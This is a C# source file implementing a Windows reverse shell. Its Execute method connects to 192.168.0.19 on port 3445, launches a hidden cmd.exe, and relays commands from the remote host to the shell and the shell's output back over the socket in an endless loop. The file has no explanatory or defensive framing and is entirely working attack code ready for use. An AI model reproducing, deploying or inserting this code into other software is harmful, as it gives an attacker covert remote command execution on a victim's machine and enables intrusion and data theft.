using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace ShellReverse
{
	public class ShellReverse
	{
		static StreamWriter streamWriter;

		public static void Execute() 
		{
			using (TcpClient client = new TcpClient("192.168.0.19", 3445))
			{
				using (Stream stream = client.GetStream())
				{
					using (StreamReader reader = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder input = new StringBuilder();

						Process process = new Process();
						process.StartInfo.FileName = "cmd.exe";
						process.StartInfo.CreateNoWindow = true;
						process.StartInfo.UseShellExecute = false;
						process.StartInfo.RedirectStandardOutput = true;
						process.StartInfo.RedirectStandardInput = true;
						process.StartInfo.RedirectStandardError = true;
						process.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						process.Start();
						process.BeginOutputReadLine();

						while (true)
						{
							input.Append(reader.ReadLine());
							process.StandardInput.WriteLine(input);
							input.Remove(0, input.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
		{
			StringBuilder output = new StringBuilder();

			if (!String.IsNullOrEmpty(outLine.Data))
			{
				try
				{
					output.Append(outLine.Data);
					streamWriter.WriteLine(output);
					streamWriter.Flush();
				}
				catch (Exception exception) { }
			}
		}
	}
}
